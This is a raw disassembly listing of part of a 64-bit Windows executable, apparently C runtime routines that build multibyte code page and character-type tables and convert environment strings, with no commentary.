   140005cd5:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140005cd9:	41 8d 40 20          	lea    0x20(%r8),%eax
   140005cdd:	83 f8 19             	cmp    $0x19,%eax
   140005ce0:	77 08                	ja     0x140005cea
   140005ce2:	80 09 10             	orb    $0x10,(%rcx)
   140005ce5:	8d 42 20             	lea    0x20(%rdx),%eax
   140005ce8:	eb 0c                	jmp    0x140005cf6
   140005cea:	41 83 f8 19          	cmp    $0x19,%r8d
   140005cee:	77 0e                	ja     0x140005cfe
   140005cf0:	80 09 20             	orb    $0x20,(%rcx)
   140005cf3:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140005cf6:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140005cfc:	eb 07                	jmp    0x140005d05
   140005cfe:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   140005d05:	ff c2                	inc    %edx
   140005d07:	48 ff c1             	inc    %rcx
   140005d0a:	3b d3                	cmp    %ebx,%edx
   140005d0c:	72 c7                	jb     0x140005cd5
   140005d0e:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   140005d15:	48 33 cc             	xor    %rsp,%rcx
   140005d18:	e8 83 bd ff ff       	call   0x140001aa0
   140005d1d:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   140005d24:	00 
   140005d25:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140005d29:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140005d2d:	49 8b e3             	mov    %r11,%rsp
   140005d30:	5d                   	pop    %rbp
   140005d31:	c3                   	ret
   140005d32:	90                   	nop
   140005d33:	90                   	nop
   140005d34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d39:	55                   	push   %rbp
   140005d3a:	56                   	push   %rsi
   140005d3b:	57                   	push   %rdi
   140005d3c:	48 8b ec             	mov    %rsp,%rbp
   140005d3f:	48 83 ec 40          	sub    $0x40,%rsp
   140005d43:	40 8a f2             	mov    %dl,%sil
   140005d46:	8b d9                	mov    %ecx,%ebx
   140005d48:	e8 63 f3 ff ff       	call   0x1400050b0
   140005d4d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140005d51:	e8 be 01 00 00       	call   0x140005f14
   140005d56:	8b cb                	mov    %ebx,%ecx
   140005d58:	e8 e3 fc ff ff       	call   0x140005a40
   140005d5d:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140005d61:	8b f8                	mov    %eax,%edi
   140005d63:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   140005d6a:	41 3b 40 04          	cmp    0x4(%r8),%eax
   140005d6e:	75 07                	jne    0x140005d77
   140005d70:	33 c0                	xor    %eax,%eax
   140005d72:	e9 b8 00 00 00       	jmp    0x140005e2f
   140005d77:	b9 28 02 00 00       	mov    $0x228,%ecx
   140005d7c:	e8 ff e9 ff ff       	call   0x140004780
   140005d81:	48 8b d8             	mov    %rax,%rbx
   140005d84:	48 85 c0             	test   %rax,%rax
   140005d87:	0f 84 95 00 00 00    	je     0x140005e22
   140005d8d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140005d91:	ba 04 00 00 00       	mov    $0x4,%edx
   140005d96:	48 8b cb             	mov    %rbx,%rcx
   140005d99:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   140005da0:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   140005da4:	0f 10 00             	movups (%rax),%xmm0
   140005da7:	0f 11 01             	movups %xmm0,(%rcx)
   140005daa:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005dae:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140005db2:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140005db6:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140005dba:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140005dbe:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140005dc2:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140005dc6:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140005dca:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140005dce:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140005dd2:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140005dd6:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140005dda:	49 03 c8             	add    %r8,%rcx
   140005ddd:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140005de1:	49 03 c0             	add    %r8,%rax
   140005de4:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140005de8:	48 83 ea 01          	sub    $0x1,%rdx
   140005dec:	75 b6                	jne    0x140005da4
   140005dee:	0f 10 00             	movups (%rax),%xmm0
   140005df1:	0f 11 01             	movups %xmm0,(%rcx)
   140005df4:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005df8:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140005dfc:	48 8b 40 20          	mov    0x20(%rax),%rax
   140005e00:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140005e04:	8b cf                	mov    %edi,%ecx
   140005e06:	21 13                	and    %edx,(%rbx)
   140005e08:	48 8b d3             	mov    %rbx,%rdx
   140005e0b:	e8 c4 01 00 00       	call   0x140005fd4
   140005e10:	8b f8                	mov    %eax,%edi
   140005e12:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005e15:	75 25                	jne    0x140005e3c
   140005e17:	e8 d4 ee ff ff       	call   0x140004cf0
   140005e1c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005e22:	83 cf ff             	or     $0xffffffff,%edi
   140005e25:	48 8b cb             	mov    %rbx,%rcx
   140005e28:	e8 13 e9 ff ff       	call   0x140004740
   140005e2d:	8b c7                	mov    %edi,%eax
   140005e2f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005e34:	48 83 c4 40          	add    $0x40,%rsp
   140005e38:	5f                   	pop    %rdi
   140005e39:	5e                   	pop    %rsi
   140005e3a:	5d                   	pop    %rbp
   140005e3b:	c3                   	ret
   140005e3c:	40 84 f6             	test   %sil,%sil
   140005e3f:	75 05                	jne    0x140005e46
   140005e41:	e8 8a e1 ff ff       	call   0x140003fd0
   140005e46:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140005e4a:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140005e51:	83 c8 ff             	or     $0xffffffff,%eax
   140005e54:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140005e58:	83 f8 01             	cmp    $0x1,%eax
   140005e5b:	75 1c                	jne    0x140005e79
   140005e5d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140005e61:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140005e68:	48 8d 05 41 f2 00 00 	lea    0xf241(%rip),%rax        # 0x1400150b0
   140005e6f:	48 3b c8             	cmp    %rax,%rcx
   140005e72:	74 05                	je     0x140005e79
   140005e74:	e8 c7 e8 ff ff       	call   0x140004740
   140005e79:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140005e7f:	48 8b cb             	mov    %rbx,%rcx
   140005e82:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140005e86:	33 db                	xor    %ebx,%ebx
   140005e88:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140005e8f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140005e93:	f6 80 a8 03 00 00 02 	testb  $0x2,0x3a8(%rax)
   140005e9a:	75 89                	jne    0x140005e25
   140005e9c:	f6 05 5d f9 00 00 01 	testb  $0x1,0xf95d(%rip)        # 0x140015800
   140005ea3:	75 80                	jne    0x140005e25
   140005ea5:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140005ea9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005ead:	4c 8d 4d 38          	lea    0x38(%rbp),%r9
   140005eb1:	8d 43 05             	lea    0x5(%rbx),%eax
   140005eb4:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140005eb8:	89 45 38             	mov    %eax,0x38(%rbp)
   140005ebb:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140005ebf:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140005ec2:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140005ec6:	e8 25 f9 ff ff       	call   0x1400057f0
   140005ecb:	48 8b 05 7e f8 00 00 	mov    0xf87e(%rip),%rax        # 0x140015750
   140005ed2:	40 84 f6             	test   %sil,%sil
   140005ed5:	48 0f 45 05 fb f3 00 	cmovne 0xf3fb(%rip),%rax        # 0x1400152d8
   140005edc:	00 
   140005edd:	48 89 05 6c f8 00 00 	mov    %rax,0xf86c(%rip)        # 0x140015750
   140005ee4:	e9 3c ff ff ff       	jmp    0x140005e25
   140005ee9:	90                   	nop
   140005eea:	90                   	nop
   140005eeb:	90                   	nop
   140005eec:	48 83 ec 28          	sub    $0x28,%rsp
   140005ef0:	80 3d 21 03 01 00 00 	cmpb   $0x0,0x10321(%rip)        # 0x140016218
   140005ef7:	75 13                	jne    0x140005f0c
   140005ef9:	b2 01                	mov    $0x1,%dl
   140005efb:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   140005f00:	e8 2f fe ff ff       	call   0x140005d34
   140005f05:	c6 05 0c 03 01 00 01 	movb   $0x1,0x1030c(%rip)        # 0x140016218
   140005f0c:	b0 01                	mov    $0x1,%al
   140005f0e:	48 83 c4 28          	add    $0x28,%rsp
   140005f12:	c3                   	ret
   140005f13:	90                   	nop
   140005f14:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005f19:	57                   	push   %rdi
   140005f1a:	48 83 ec 20          	sub    $0x20,%rsp
   140005f1e:	e8 8d f1 ff ff       	call   0x1400050b0
   140005f23:	48 8b f8             	mov    %rax,%rdi
   140005f26:	8b 0d d4 f8 00 00    	mov    0xf8d4(%rip),%ecx        # 0x140015800
   140005f2c:	85 88 a8 03 00 00    	test   %ecx,0x3a8(%rax)
   140005f32:	74 13                	je     0x140005f47
   140005f34:	48 83 b8 90 00 00 00 	cmpq   $0x0,0x90(%rax)
   140005f3b:	00 
   140005f3c:	74 09                	je     0x140005f47
   140005f3e:	48 8b 98 88 00 00 00 	mov    0x88(%rax),%rbx
   140005f45:	eb 73                	jmp    0x140005fba
   140005f47:	b9 05 00 00 00       	mov    $0x5,%ecx
   140005f4c:	e8 2b 05 00 00       	call   0x14000647c
   140005f51:	90                   	nop
   140005f52:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140005f59:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005f5e:	48 3b 1d 73 f3 00 00 	cmp    0xf373(%rip),%rbx        # 0x1400152d8
   140005f65:	74 49                	je     0x140005fb0
   140005f67:	48 85 db             	test   %rbx,%rbx
   140005f6a:	74 22                	je     0x140005f8e
   140005f6c:	83 c8 ff             	or     $0xffffffff,%eax
   140005f6f:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   140005f73:	83 f8 01             	cmp    $0x1,%eax
   140005f76:	75 16                	jne    0x140005f8e
   140005f78:	48 8d 05 31 f1 00 00 	lea    0xf131(%rip),%rax        # 0x1400150b0
   140005f7f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005f84:	48 3b c8             	cmp    %rax,%rcx
   140005f87:	74 05                	je     0x140005f8e
   140005f89:	e8 b2 e7 ff ff       	call   0x140004740
   140005f8e:	48 8b 05 43 f3 00 00 	mov    0xf343(%rip),%rax        # 0x1400152d8
   140005f95:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   140005f9c:	48 8b 05 35 f3 00 00 	mov    0xf335(%rip),%rax        # 0x1400152d8
   140005fa3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005fa8:	f0 ff 00             	lock incl (%rax)
   140005fab:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005fb0:	b9 05 00 00 00       	mov    $0x5,%ecx
   140005fb5:	e8 16 05 00 00       	call   0x1400064d0
   140005fba:	48 85 db             	test   %rbx,%rbx
   140005fbd:	75 06                	jne    0x140005fc5
   140005fbf:	e8 1c e8 ff ff       	call   0x1400047e0
   140005fc4:	cc                   	int3
   140005fc5:	48 8b c3             	mov    %rbx,%rax
   140005fc8:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005fcd:	48 83 c4 20          	add    $0x20,%rsp
   140005fd1:	5f                   	pop    %rdi
   140005fd2:	c3                   	ret
   140005fd3:	90                   	nop
   140005fd4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005fd9:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140005fde:	56                   	push   %rsi
   140005fdf:	57                   	push   %rdi
   140005fe0:	41 54                	push   %r12
   140005fe2:	41 56                	push   %r14
   140005fe4:	41 57                	push   %r15
   140005fe6:	48 83 ec 40          	sub    $0x40,%rsp
   140005fea:	48 8b 05 27 f0 00 00 	mov    0xf027(%rip),%rax        # 0x140015018
   140005ff1:	48 33 c4             	xor    %rsp,%rax
   140005ff4:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005ff9:	48 8b da             	mov    %rdx,%rbx
   140005ffc:	e8 3f fa ff ff       	call   0x140005a40
   140006001:	33 f6                	xor    %esi,%esi
   140006003:	8b f8                	mov    %eax,%edi
   140006005:	85 c0                	test   %eax,%eax
   140006007:	75 0d                	jne    0x140006016
   140006009:	48 8b cb             	mov    %rbx,%rcx
   14000600c:	e8 af fa ff ff       	call   0x140005ac0
   140006011:	e9 3d 02 00 00       	jmp    0x140006253
   140006016:	4c 8d 25 d3 f2 00 00 	lea    0xf2d3(%rip),%r12        # 0x1400152f0
   14000601d:	8b ee                	mov    %esi,%ebp
   14000601f:	49 8b c4             	mov    %r12,%rax
   140006022:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140006028:	39 38                	cmp    %edi,(%rax)
   14000602a:	0f 84 30 01 00 00    	je     0x140006160
   140006030:	41 03 ef             	add    %r15d,%ebp
   140006033:	48 83 c0 30          	add    $0x30,%rax
   140006037:	83 fd 05             	cmp    $0x5,%ebp
   14000603a:	72 ec                	jb     0x140006028
   14000603c:	8d 87 18 02 ff ff    	lea    -0xfde8(%rdi),%eax
   140006042:	41 3b c7             	cmp    %r15d,%eax
   140006045:	0f 86 0d 01 00 00    	jbe    0x140006158
   14000604b:	0f b7 cf             	movzwl %di,%ecx
   14000604e:	ff 15 84 61 00 00    	call   *0x6184(%rip)        # 0x14000c1d8
   140006054:	85 c0                	test   %eax,%eax
   140006056:	0f 84 fc 00 00 00    	je     0x140006158
   14000605c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140006061:	8b cf                	mov    %edi,%ecx
   140006063:	ff 15 7f 61 00 00    	call   *0x617f(%rip)        # 0x14000c1e8
   140006069:	85 c0                	test   %eax,%eax
   14000606b:	0f 84 db 00 00 00    	je     0x14000614c
   140006071:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   140006075:	33 d2                	xor    %edx,%edx
   140006077:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   14000607d:	e8 3e c7 ff ff       	call   0x1400027c0
   140006082:	89 7b 04             	mov    %edi,0x4(%rbx)
   140006085:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   14000608c:	44 39 7c 24 20       	cmp    %r15d,0x20(%rsp)
   140006091:	0f 86 9e 00 00 00    	jbe    0x140006135
   140006097:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   14000609c:	40 38 74 24 26       	cmp    %sil,0x26(%rsp)
   1400060a1:	74 30                	je     0x1400060d3
   1400060a3:	40 38 71 01          	cmp    %sil,0x1(%rcx)
   1400060a7:	74 2a                	je     0x1400060d3
   1400060a9:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   1400060ad:	0f b6 11             	movzbl (%rcx),%edx
   1400060b0:	3b d0                	cmp    %eax,%edx
   1400060b2:	77 16                	ja     0x1400060ca
   1400060b4:	2b c2                	sub    %edx,%eax
   1400060b6:	8d 7a 01             	lea    0x1(%rdx),%edi
   1400060b9:	41 8d 14 07          	lea    (%r15,%rax,1),%edx
   1400060bd:	80 4c 1f 18 04       	orb    $0x4,0x18(%rdi,%rbx,1)
   1400060c2:	41 03 ff             	add    %r15d,%edi
   1400060c5:	49 2b d7             	sub    %r15,%rdx
   1400060c8:	75 f3                	jne    0x1400060bd
   1400060ca:	48 83 c1 02          	add    $0x2,%rcx
   1400060ce:	40 38 31             	cmp    %sil,(%rcx)
   1400060d1:	75 d0                	jne    0x1400060a3
   1400060d3:	48 8d 43 1a          	lea    0x1a(%rbx),%rax
   1400060d7:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   1400060dc:	80 08 08             	orb    $0x8,(%rax)
   1400060df:	49 03 c7             	add    %r15,%rax
   1400060e2:	49 2b cf             	sub    %r15,%rcx
   1400060e5:	75 f5                	jne    0x1400060dc
   1400060e7:	8b 4b 04             	mov    0x4(%rbx),%ecx
   1400060ea:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   1400060f0:	74 2f                	je     0x140006121
   1400060f2:	83 e9 04             	sub    $0x4,%ecx
   1400060f5:	74 21                	je     0x140006118
   1400060f7:	83 e9 0d             	sub    $0xd,%ecx
   1400060fa:	74 13                	je     0x14000610f
   1400060fc:	41 3b cf             	cmp    %r15d,%ecx
   1400060ff:	74 05                	je     0x140006106
   140006101:	48 8b c6             	mov    %rsi,%rax
   140006104:	eb 22                	jmp    0x140006128
   140006106:	48 8b 05 f3 67 00 00 	mov    0x67f3(%rip),%rax        # 0x14000c900
   14000610d:	eb 19                	jmp    0x140006128
   14000610f:	48 8b 05 e2 67 00 00 	mov    0x67e2(%rip),%rax        # 0x14000c8f8
   140006116:	eb 10                	jmp    0x140006128
   140006118:	48 8b 05 d1 67 00 00 	mov    0x67d1(%rip),%rax        # 0x14000c8f0
   14000611f:	eb 07                	jmp    0x140006128
   140006121:	48 8b 05 c0 67 00 00 	mov    0x67c0(%rip),%rax        # 0x14000c8e8
   140006128:	48 89 83 20 02 00 00 	mov    %rax,0x220(%rbx)
   14000612f:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   140006133:	eb 03                	jmp    0x140006138
   140006135:	89 73 08             	mov    %esi,0x8(%rbx)
   140006138:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   14000613c:	0f b7 c6             	movzwl %si,%eax
   14000613f:	b9 06 00 00 00       	mov    $0x6,%ecx
   140006144:	66 f3 ab             	rep stos %ax,(%rdi)
   140006147:	e9 ff 00 00 00       	jmp    0x14000624b
   14000614c:	39 35 ba 00 01 00    	cmp    %esi,0x100ba(%rip)        # 0x14001620c
   140006152:	0f 85 b1 fe ff ff    	jne    0x140006009
   140006158:	83 c8 ff             	or     $0xffffffff,%eax
   14000615b:	e9 f5 00 00 00       	jmp    0x140006255
   140006160:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   140006164:	33 d2                	xor    %edx,%edx
   140006166:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   14000616c:	e8 4f c6 ff ff       	call   0x1400027c0
   140006171:	8b c5                	mov    %ebp,%eax
   140006173:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   140006178:	4c 8d 35 61 f1 00 00 	lea    0xf161(%rip),%r14        # 0x1400152e0
   14000617f:	bd 04 00 00 00       	mov    $0x4,%ebp
   140006184:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   140006188:	49 c1 e3 04          	shl    $0x4,%r11
   14000618c:	4d 03 cb             	add    %r11,%r9
   14000618f:	49 8b d1             	mov    %r9,%rdx
   140006192:	41 38 31             	cmp    %sil,(%r9)
   140006195:	74 40                	je     0x1400061d7
   140006197:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   14000619b:	74 3a                	je     0x1400061d7
   14000619d:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400061a1:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400061a5:	44 3b c0             	cmp    %eax,%r8d
   1400061a8:	77 24                	ja     0x1400061ce
   1400061aa:	45 8d 50 01          	lea    0x1(%r8),%r10d
   1400061ae:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   1400061b5:	73 17                	jae    0x1400061ce
   1400061b7:	41 8a 06             	mov    (%r14),%al
   1400061ba:	45 03 c7             	add    %r15d,%r8d
   1400061bd:	41 08 44 1a 18       	or     %al,0x18(%r10,%rbx,1)
   1400061c2:	45 03 d7             	add    %r15d,%r10d
   1400061c5:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400061c9:	44 3b c0             	cmp    %eax,%r8d
   1400061cc:	76 e0                	jbe    0x1400061ae
   1400061ce:	48 83 c2 02          	add    $0x2,%rdx
   1400061d2:	40 38 32             	cmp    %sil,(%rdx)
   1400061d5:	75 c0                	jne    0x140006197
   1400061d7:	49 83 c1 08          	add    $0x8,%r9
   1400061db:	4d 03 f7             	add    %r15,%r14
   1400061de:	49 2b ef             	sub    %r15,%rbp
   1400061e1:	75 ac                	jne    0x14000618f
   1400061e3:	89 7b 04             	mov    %edi,0x4(%rbx)
   1400061e6:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   1400061ea:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   1400061f0:	74 2a                	je     0x14000621c
   1400061f2:	83 ef 04             	sub    $0x4,%edi
   1400061f5:	74 1c                	je     0x140006213
   1400061f7:	83 ef 0d             	sub    $0xd,%edi
   1400061fa:	74 0e                	je     0x14000620a
   1400061fc:	41 3b ff             	cmp    %r15d,%edi
   1400061ff:	75 22                	jne    0x140006223
   140006201:	48 8b 35 f8 66 00 00 	mov    0x66f8(%rip),%rsi        # 0x14000c900
   140006208:	eb 19                	jmp    0x140006223
   14000620a:	48 8b 35 e7 66 00 00 	mov    0x66e7(%rip),%rsi        # 0x14000c8f8
   140006211:	eb 10                	jmp    0x140006223
   140006213:	48 8b 35 d6 66 00 00 	mov    0x66d6(%rip),%rsi        # 0x14000c8f0
   14000621a:	eb 07                	jmp    0x140006223
   14000621c:	48 8b 35 c5 66 00 00 	mov    0x66c5(%rip),%rsi        # 0x14000c8e8
   140006223:	4c 2b db             	sub    %rbx,%r11
   140006226:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   14000622d:	48 8d 4b 0c          	lea    0xc(%rbx),%rcx
   140006231:	ba 06 00 00 00       	mov    $0x6,%edx
   140006236:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   14000623a:	0f b7 44 0f f8       	movzwl -0x8(%rdi,%rcx,1),%eax
   14000623f:	66 89 01             	mov    %ax,(%rcx)
   140006242:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140006246:	49 2b d7             	sub    %r15,%rdx
   140006249:	75 ef                	jne    0x14000623a
   14000624b:	48 8b cb             	mov    %rbx,%rcx
   14000624e:	e8 fd f8 ff ff       	call   0x140005b50
   140006253:	33 c0                	xor    %eax,%eax
   140006255:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000625a:	48 33 cc             	xor    %rsp,%rcx
   14000625d:	e8 3e b8 ff ff       	call   0x140001aa0
   140006262:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140006267:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   14000626b:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   14000626f:	49 8b e3             	mov    %r11,%rsp
   140006272:	41 5f                	pop    %r15
   140006274:	41 5e                	pop    %r14
   140006276:	41 5c                	pop    %r12
   140006278:	5f                   	pop    %rdi
   140006279:	5e                   	pop    %rsi
   14000627a:	c3                   	ret
   14000627b:	90                   	nop
   14000627c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006281:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006286:	57                   	push   %rdi
   140006287:	48 83 ec 40          	sub    $0x40,%rsp
   14000628b:	8b da                	mov    %edx,%ebx
   14000628d:	41 8b f9             	mov    %r9d,%edi
   140006290:	48 8b d1             	mov    %rcx,%rdx
   140006293:	41 8b f0             	mov    %r8d,%esi
   140006296:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000629b:	e8 10 e6 ff ff       	call   0x1400048b0
   1400062a0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400062a5:	0f b6 d3             	movzbl %bl,%edx
   1400062a8:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   1400062ad:	75 1a                	jne    0x1400062c9
   1400062af:	85 f6                	test   %esi,%esi
   1400062b1:	74 10                	je     0x1400062c3
   1400062b3:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400062b8:	48 8b 08             	mov    (%rax),%rcx
   1400062bb:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   1400062bf:	23 c6                	and    %esi,%eax
   1400062c1:	eb 02                	jmp    0x1400062c5
   1400062c3:	33 c0                	xor    %eax,%eax
   1400062c5:	85 c0                	test   %eax,%eax
   1400062c7:	74 05                	je     0x1400062ce
   1400062c9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400062ce:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400062d3:	74 0c                	je     0x1400062e1
   1400062d5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400062da:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1400062e1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400062e6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400062eb:	48 83 c4 40          	add    $0x40,%rsp
   1400062ef:	5f                   	pop    %rdi
   1400062f0:	c3                   	ret
   1400062f1:	90                   	nop
   1400062f2:	90                   	nop
   1400062f3:	90                   	nop
   1400062f4:	8b d1                	mov    %ecx,%edx
   1400062f6:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400062fc:	33 c9                	xor    %ecx,%ecx
   1400062fe:	45 33 c0             	xor    %r8d,%r8d
   140006301:	e9 76 ff ff ff       	jmp    0x14000627c
   140006306:	90                   	nop
   140006307:	90                   	nop
   140006308:	48 83 ec 28          	sub    $0x28,%rsp
   14000630c:	ff 15 de 5e 00 00    	call   *0x5ede(%rip)        # 0x14000c1f0
   140006312:	48 89 05 17 ff 00 00 	mov    %rax,0xff17(%rip)        # 0x140016230
   140006319:	ff 15 d9 5e 00 00    	call   *0x5ed9(%rip)        # 0x14000c1f8
   14000631f:	48 89 05 12 ff 00 00 	mov    %rax,0xff12(%rip)        # 0x140016238
   140006326:	b0 01                	mov    $0x1,%al
   140006328:	48 83 c4 28          	add    $0x28,%rsp
   14000632c:	c3                   	ret
   14000632d:	90                   	nop
   14000632e:	90                   	nop
   14000632f:	90                   	nop
   140006330:	48 8b c4             	mov    %rsp,%rax
   140006333:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006337:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000633b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000633f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006343:	41 56                	push   %r14
   140006345:	48 83 ec 40          	sub    $0x40,%rsp
   140006349:	ff 15 b1 5e 00 00    	call   *0x5eb1(%rip)        # 0x14000c200
   14000634f:	45 33 f6             	xor    %r14d,%r14d
   140006352:	48 8b d8             	mov    %rax,%rbx
   140006355:	48 85 c0             	test   %rax,%rax
   140006358:	0f 84 a6 00 00 00    	je     0x140006404
   14000635e:	48 8b f0             	mov    %rax,%rsi
   140006361:	66 44 39 30          	cmp    %r14w,(%rax)
   140006365:	74 1c                	je     0x140006383
   140006367:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000636b:	48 ff c0             	inc    %rax
   14000636e:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   140006373:	75 f6                	jne    0x14000636b
   140006375:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   140006379:	48 83 c6 02          	add    $0x2,%rsi
   14000637d:	66 44 39 36          	cmp    %r14w,(%rsi)
   140006381:	75 e4                	jne    0x140006367
   140006383:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006388:	48 2b f3             	sub    %rbx,%rsi
   14000638b:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140006390:	48 83 c6 02          	add    $0x2,%rsi
   140006394:	48 d1 fe             	sar    $1,%rsi
   140006397:	4c 8b c3             	mov    %rbx,%r8
   14000639a:	44 8b ce             	mov    %esi,%r9d
   14000639d:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400063a2:	33 d2                	xor    %edx,%edx
   1400063a4:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400063a9:	33 c9                	xor    %ecx,%ecx
   1400063ab:	ff 15 cf 5d 00 00    	call   *0x5dcf(%rip)        # 0x14000c180
   1400063b1:	48 63 e8             	movslq %eax,%rbp
   1400063b4:	85 c0                	test   %eax,%eax
   1400063b6:	74 4c                	je     0x140006404
   1400063b8:	48 8b cd             	mov    %rbp,%rcx
   1400063bb:	e8 c0 e3 ff ff       	call   0x140004780
   1400063c0:	48 8b f8             	mov    %rax,%rdi
   1400063c3:	48 85 c0             	test   %rax,%rax
   1400063c6:	74 2f                	je     0x1400063f7
   1400063c8:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400063cd:	44 8b ce             	mov    %esi,%r9d
   1400063d0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400063d5:	4c 8b c3             	mov    %rbx,%r8
   1400063d8:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1400063dc:	33 d2                	xor    %edx,%edx
